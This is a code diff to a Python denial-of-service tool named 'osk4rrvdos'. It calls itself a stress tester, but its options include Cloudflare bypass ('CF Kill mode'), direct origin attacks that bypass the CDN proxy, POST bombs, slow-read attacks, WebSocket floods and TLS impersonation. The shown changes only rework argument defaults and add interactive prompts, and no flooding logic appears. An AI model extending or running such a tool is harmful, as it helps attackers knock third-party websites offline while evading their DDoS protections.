@@ -1597,7 +1597,8 @@ def main():
     cli = getattr(sys.modules[__name__], "command_line_args", None)
     if cli:
         interactive = not any([cli.bypass, cli.boost, cli.multi_method,
-                               cli.post_bomb, cli.slow_read, cli.adaptive, cli.cf_kill])
+                               cli.post_bomb, cli.slow_read, cli.adaptive, cli.cf_kill,
+                               cli.http2, cli.websocket, cli.force_close])
 
     try:
         show_banner()
@@ -1654,10 +1655,10 @@ def main():
     if cf_kill:
         direct_origin = _bool_or_prompt(cli.direct_origin if cli else None, "[osk4rrvdos] Direct origin attack (bypass CF proxy) [y/n]: ", interactive)
 
-    use_http2 = bool(cli.http2 if cli else False)
-    enable_websocket = bool(cli.websocket if cli else False)
-    force_close_conns = bool(cli.force_close if cli else False)
-    if cli and cli.no_curl:
+    use_http2 = _bool_or_prompt(cli.http2 if cli else None, "[osk4rrvdos] HTTP/2 [y/n]: ", interactive)
+    enable_websocket = _bool_or_prompt(cli.websocket if cli else None, "[osk4rrvdos] WebSocket flood [y/n]: ", interactive)
+    force_close_conns = _bool_or_prompt(cli.force_close if cli else None, "[osk4rrvdos] Force close connections [y/n]: ", interactive)
+    if cli and cli.no_curl is True:
         use_curl_cffi = False
 
     if cli and cli.payload_size:
@@ -1921,21 +1922,21 @@ def main():
 def parse_args():
     parser = argparse.ArgumentParser(description="osk4rrvdos - network stress testing tool")
     parser.add_argument("--target", "-t", type=str, help="Target URL")
-    parser.add_argument("--bypass", "-b", action="store_true", help="Enable bypass")
-    parser.add_argument("--boost", "-B", action="store_true", help="Enable boost mode")
-    parser.add_argument("--multi-method", "-m", action="store_true", help="Enable multi-method")
-    parser.add_argument("--post-bomb", "-P", action="store_true", help="Enable POST bomb")
-    parser.add_argument("--slow-read", "-s", action="store_true", help="Enable slow read")
-    parser.add_argument("--adaptive", "-a", action="store_true", help="Enable adaptive scaling")
-    parser.add_argument("--cf-kill", "-c", action="store_true", help="Enable CF Kill mode")
-    parser.add_argument("--direct-origin", "-d", action="store_true", help="Enable direct origin attack")
-    parser.add_argument("--http2", "-2", action="store_true", help="Force HTTP/2 where supported")
-    parser.add_argument("--websocket", "-w", action="store_true", help="Enable WebSocket flood")
-    parser.add_argument("--force-close", "-f", action="store_true", help="Force close connections after each request")
+    parser.add_argument("--bypass", "-b", action="store_true", default=None, help="Enable bypass")
+    parser.add_argument("--boost", "-B", action="store_true", default=None, help="Enable boost mode")
+    parser.add_argument("--multi-method", "-m", action="store_true", default=None, help="Enable multi-method")
+    parser.add_argument("--post-bomb", "-P", action="store_true", default=None, help="Enable POST bomb")
+    parser.add_argument("--slow-read", "-s", action="store_true", default=None, help="Enable slow read")
+    parser.add_argument("--adaptive", "-a", action="store_true", default=None, help="Enable adaptive scaling")
+    parser.add_argument("--cf-kill", "-c", action="store_true", default=None, help="Enable CF Kill mode")
+    parser.add_argument("--direct-origin", "-d", action="store_true", default=None, help="Enable direct origin attack")
+    parser.add_argument("--http2", "-2", action="store_true", default=None, help="Force HTTP/2 where supported")
+    parser.add_argument("--websocket", "-w", action="store_true", default=None, help="Enable WebSocket flood")
+    parser.add_argument("--force-close", "-f", action="store_true", default=None, help="Force close connections after each request")
     parser.add_argument("--payload-size", type=int, default=1, help="Payload size in KB")
     parser.add_argument("--sessions", type=int, default=3, help="Number of sessions")
     parser.add_argument("--conns", type=int, default=0, help="Connections per session (0=auto)")
-    parser.add_argument("--no-curl", action="store_true", help="Disable curl_cffi TLS impersonation (use aiohttp)")
+    parser.add_argument("--no-curl", action="store_true", default=None, help="Disable curl_cffi TLS impersonation (use aiohttp)")
     parser.add_argument("--config", "-C", type=str, help="Config file path")
     return parser.parse_args()
 
